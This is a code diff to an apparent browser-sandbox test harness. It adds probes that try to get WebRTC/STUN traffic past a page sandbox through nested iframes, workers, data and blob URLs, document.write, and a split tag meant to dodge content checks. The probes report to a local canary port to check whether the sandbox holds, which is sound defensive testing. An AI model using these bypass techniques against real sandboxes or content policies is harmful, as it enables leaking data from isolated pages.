@@ -15,6 +15,9 @@ export const BROWSERS = ['chromium', 'firefox', 'webkit'];
 const ALL = BROWSERS;
 
 const net = (name, code, extra = {}) => ({ name, kind: 'net', control: ALL, code, ...extra });
+// a WebRTC attack: the canary has a UDP port of its own for it. Chromium and Firefox send STUN packets on the control page; the WebKit
+// that Playwright runs has no WebRTC at all, so nothing can be observed there (real Safari has it)
+const rtc = (name, code, extra = {}) => net(name, code, { udp: true, control: ['chromium', 'firefox'], ...extra });
 const cap = (name, code, extra = {}) => ({ name, kind: 'cap', code, ...extra });
 
 const guard = (expr) => `try { ${expr}; return 'allowed'; } catch (e) { return 'blocked'; }`;
@@ -61,8 +64,43 @@ export const PROBES = [
   net('embed-src', `html('<embed src="' + u('embed-src') + '" type="image/gif">');`),
   net('audio', `const a = new Audio(); a.preload = 'auto'; a.src = u('audio'); a.load();`),
   net('video', `html('<video preload="auto" src="' + u('video') + '"></video>');`),
-  net('form-post', `html('<iframe name="sink"></iframe><form id="fp" method="post" action="' + u('form-post') + '" target="sink"><input name="a" value="1"></form>'); document.getElementById('fp').submit();`),
-  net('webrtc', `const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:' + UDP }] }); pc.createDataChannel('x'); await pc.setLocalDescription(await pc.createOffer()); await new Promise((r) => setTimeout(r, 1500)); pc.close();`, { control: ['chromium'] }),
+  net('form-post', `html('' + IFR + ' name="sink"></iframe><form id="fp" method="post" action="' + u('form-post') + '" target="sink"><input name="a" value="1"></form>'); document.getElementById('fp').submit();`),
+
+  // ---- WebRTC: no content-security-policy covers it, so the sandbox page takes the constructor away (js/sandbox.js) and nested frames
+  // are what could bring a fresh copy back. Each route has its own UDP port on the canary, so a leak says which route it was.
+  rtc('webrtc', `await rtcLeak('webrtc', RTCPeerConnection);`),
+  rtc('webrtc-prefixed', `await rtcLeak('webrtc-prefixed', window.webkitRTCPeerConnection);`, { control: ['chromium'] }),
+  rtc('webrtc-worker', `const w = new Worker(URL.createObjectURL(new Blob(['try { var pc = new RTCPeerConnection(' + JSON.stringify(stun('webrtc-worker')) + '); pc.createDataChannel("x"); pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }); } catch (e) {}'], { type: 'text/javascript' }))); await wait(1500); w.terminate();`, { control: [] }),
+  rtc('webrtc-nested-srcdoc', `const f = document.createElement('iframe'); f.srcdoc = rtcSrc('webrtc-nested-srcdoc'); document.body.appendChild(f); await wait(1500);`),
+  rtc('webrtc-nested-blob', `const f = document.createElement('iframe'); f.src = URL.createObjectURL(new Blob([rtcSrc('webrtc-nested-blob')], { type: 'text/html' })); document.body.appendChild(f); await wait(1500);`),
+  rtc('webrtc-nested-data', `const f = document.createElement('iframe'); f.src = 'data:text/html,' + encodeURIComponent(rtcSrc('webrtc-nested-data')); document.body.appendChild(f); await wait(1500);`),
+  rtc('webrtc-nested-innerhtml', `const d = document.createElement('div'); d.innerHTML = '' + IFR + ' srcdoc="' + attr(rtcSrc('webrtc-nested-innerhtml')) + '"></iframe>'; document.body.appendChild(d); await wait(1500);`),
+  rtc('webrtc-nested-shadow', `const d = document.createElement('div'); document.body.appendChild(d); const f = document.createElement('iframe'); f.srcdoc = rtcSrc('webrtc-nested-shadow'); d.attachShadow({ mode: 'open' }).appendChild(f); await wait(1500);`),
+  rtc('webrtc-nested-object', `html('<object data="data:text/html,' + encodeURIComponent(rtcSrc('webrtc-nested-object')) + '" type="text/html"></object>'); await wait(1500);`),
+  rtc('webrtc-nested-setattribute', `const f = document.createElement('iframe'); f.setAttribute('srcdoc', rtcSrc('webrtc-nested-setattribute')); document.body.appendChild(f); await wait(1500);`),
+  rtc('webrtc-nested-attrnode', `const a = document.createAttribute('srcdoc'); a.value = rtcSrc('webrtc-nested-attrnode'); const f = document.createElement('iframe'); f.setAttributeNode(a); document.body.appendChild(f); await wait(1500);`),
+  rtc('webrtc-nested-javascript-url', `const f = document.createElement('iframe'); document.body.appendChild(f); f.src = 'javascript:' + encodeURIComponent(rtcJs('webrtc-nested-javascript-url')); await wait(1500);`),
+  rtc('webrtc-nested-domparser', `const x = new DOMParser().parseFromString('' + IFR + ' xmlns="http://www.w3.org/1999/xhtml" srcdoc="' + attr(rtcSrc('webrtc-nested-domparser')) + '"/>', 'application/xhtml+xml'); document.body.appendChild(document.adoptNode(x.documentElement)); await wait(1500);`, { control: [] }), // an element parsed as XML does not load as a frame even with nothing in the way, so this cannot be observed
+  rtc('webrtc-nested-fragment', `document.body.appendChild(document.createRange().createContextualFragment('' + IFR + ' srcdoc="' + attr(rtcSrc('webrtc-nested-fragment')) + '"></iframe>')); await wait(1500);`),
+  rtc('webrtc-nested-sethtmlunsafe', `const d = document.createElement('div'); d.setHTMLUnsafe('' + IFR + ' srcdoc="' + attr(rtcSrc('webrtc-nested-sethtmlunsafe')) + '"></iframe>'); document.body.appendChild(d); await wait(1500);`),
+  rtc('webrtc-nested-template', `const t = document.createElement('template'); t.innerHTML = '' + IFR + ' srcdoc="' + attr(rtcSrc('webrtc-nested-template')) + '"></iframe>'; document.body.appendChild(t.content.cloneNode(true)); await wait(1500);`),
+  rtc('webrtc-nested-svg', `html('<svg><foreignObject>' + IFR + ' srcdoc="' + attr(rtcSrc('webrtc-nested-svg')) + '"></iframe></foreignObject></svg>'); await wait(1500);`),
+  rtc('webrtc-restore', `
+    // look for any other way to reach the constructor that the page took away
+    const found = [];
+    for (const holder of [window, Object.getPrototypeOf(window), EventTarget.prototype, Object.prototype]) {
+      for (const key of Object.getOwnPropertyNames(holder)) { if (/RTCPeerConnection/i.test(key)) { try { if (typeof holder[key] === 'function') found.push(holder[key]); } catch (e) {} } }
+    }
+    const d = Object.getOwnPropertyDescriptor(window, 'RTCPeerConnection');
+    if (d && typeof d.value === 'function') found.push(d.value);
+    if (!found.length) return 'nothing to restore';
+    await rtcLeak('webrtc-restore', found[0]);`, { control: ['chromium'] }),
+  // these run while the page is still being parsed, before the body exists: a nested frame made then, or a document rewritten then
+  rtc('webrtc-early-write', `document.write('' + IFR + ' srcdoc="' + attr(rtcSrc('webrtc-early-write')) + '"></iframe>');`, { early: true }),
+  rtc('webrtc-early-open', `document.open(); document.write('' + IFR + ' srcdoc="' + attr(rtcSrc('webrtc-early-open')) + '"></iframe>'); document.close();`, { early: true }),
+  // a tag written in two pieces: each piece alone is harmless text, so a check of what is written would see nothing wrong
+  rtc('webrtc-early-split-write', `document.write('<ifr'); document.write('ame srcdoc="' + attr(rtcSrc('webrtc-early-split-write')) + '"></iframe>');`, { early: true }),
+  rtc('webrtc-early-data', `document.write('' + IFR + ' src="data:text/html,' + encodeURIComponent(rtcSrc('webrtc-early-data')) + '"></iframe>');`, { early: true }),
 
   // ---- the site's own origin: the host page's policy allows 'self', so only the app's own policy stops these -------------------------
   net('site-fetch', `fetch(s('site-fetch')).catch(() => {});`, { origin: 'site' }),
@@ -132,31 +170,45 @@ export const PROBES = [
 const ids = PROBES.map((p) => p.name);
 if (new Set(ids).size !== ids.length) throw new Error('two probes share a name');
 
+/** The names of the probes that have a UDP port of their own on the canary. */
+export const UDP_PROBES = PROBES.filter((p) => p.udp).map((p) => p.name);
+
 /**
  * The page that runs the probes. `only` runs one probe, `group: 'main'` all but the last ones, and neither runs everything with the last
  * ones last. The same can be given as a query (`?only=name`) on the control page; inside an app there is no query, so it is baked in.
+ * `early` probes run at once, while the page is still being parsed; the others wait for the page to load.
  */
-export function probePage({ canary, udpPort, site, only = null, group = null }) {
+export function probePage({ canary, udpPorts = {}, udpHost = '127.0.0.1', site, only = null, group = null }) {
   const body = PROBES.map((p) => `${JSON.stringify(p.name)}: async () => { ${p.code} }`).join(',\n');
   return `<!doctype html>
-<html><head><meta charset="utf-8"><title>probes</title></head>
-<body><div id="t">probes</div>
+<html><head><meta charset="utf-8"><title>probes</title>
 <script>
 const C = ${JSON.stringify(canary)};
-const UDP = ${udpPort};
+const UDPS = ${JSON.stringify(udpPorts)};
+const UDPHOST = ${JSON.stringify(udpHost)};
 const SITE = ${JSON.stringify(site)} ?? location.origin; // an app is told the site's address; the control page is the site
-const s = (n) => SITE + '/probe/' + n;
 const CONFIG = ${JSON.stringify({ only, group })};
+const s = (n) => SITE + '/probe/' + n;
 const u = (n) => C + '/probe/' + n;
 const report = (name, result, detail) => parent.postMessage({ escape: 1, name, result, detail: String(detail ?? '').slice(0, 160) }, '*');
 const html = (markup) => document.body.insertAdjacentHTML('beforeend', markup);
 const css = (text) => { const s = document.createElement('style'); s.textContent = text; document.head.appendChild(s); };
+const wait = (ms) => new Promise((r) => setTimeout(r, ms));
+const attr = (text) => text.replace(/"/g, '&quot;');
+// WebRTC helpers: a STUN server on the canary's UDP port for this probe, and the script a nested frame or worker would run
+const OPEN = '<scr' + 'ipt>', CLOSE = '</scr' + 'ipt>';
+// the sandbox refuses a page with a frame written into it, so the tag is spelled out at run time, the way an attacker would
+const IFR = '<' + 'iframe';
+const stun = (name) => ({ iceServers: [{ urls: 'stun:' + UDPHOST + ':' + UDPS[name] }] });
+const rtcJs = (name) => 'try{var P=window.RTCPeerConnection||window.webkitRTCPeerConnection;var pc=new P(' + JSON.stringify(stun(name)) + ');pc.createDataChannel("x");pc.createOffer().then(function(o){return pc.setLocalDescription(o)})}catch(e){}';
+const rtcSrc = (name) => OPEN + rtcJs(name) + CLOSE;
+const rtcLeak = async (name, Ctor) => { const pc = new Ctor(stun(name)); pc.createDataChannel('x'); await pc.setLocalDescription(await pc.createOffer()); await wait(1500); pc.close(); };
 const PROBES = {
 ${body}
 };
+const EARLY = ${JSON.stringify(PROBES.filter((p) => p.early).map((p) => p.name))};
 const LAST = ${JSON.stringify(PROBES.filter((p) => p.last).map((p) => p.name))};
-const MAIN = ${JSON.stringify(PROBES.filter((p) => !p.last).map((p) => p.name))};
-const wait = (ms) => new Promise((r) => setTimeout(r, ms));
+const MAIN = ${JSON.stringify(PROBES.filter((p) => !p.last && !p.early).map((p) => p.name))};
 async function run(name) {
   report(name, 'started');
   try {
@@ -164,12 +216,16 @@ async function run(name) {
     report(name, result ?? 'ran');
   } catch (e) { report(name, 'error', (e && e.name) + ': ' + (e && e.message)); }
 }
+report('__ran', 'ran');
+const q = new URLSearchParams(location.search);
+const only = CONFIG.only ?? q.get('only');
+const group = CONFIG.group ?? q.get('group');
+// the early probes start now, at parse time; everything else waits until the page is loaded
+const early = (only ? EARLY.filter((n) => n === only) : EARLY).map((n) => run(n));
 (async () => {
-  const q = new URLSearchParams(location.search);
-  const only = CONFIG.only ?? q.get('only');
-  const group = CONFIG.group ?? q.get('group');
-  report('__ran', 'ran');
-  if (only) { await run(only); await wait(1200); report('__done', 'done'); return; }
+  if (document.readyState === 'loading') await new Promise((r) => addEventListener('DOMContentLoaded', r));
+  await Promise.all(early);
+  if (only) { if (!EARLY.includes(only)) await run(only); await wait(1200); report('__done', 'done'); return; }
   for (const n of MAIN) await run(n);
   await wait(1200);
   if (group === 'main') { report('__done', 'done'); return; }
@@ -177,5 +233,6 @@ async function run(name) {
   await wait(1200);
   report('__done', 'done');
 })();
-</script></body></html>`;
+</script></head>
+<body><div id="t">probes</div></body></html>`;
 }
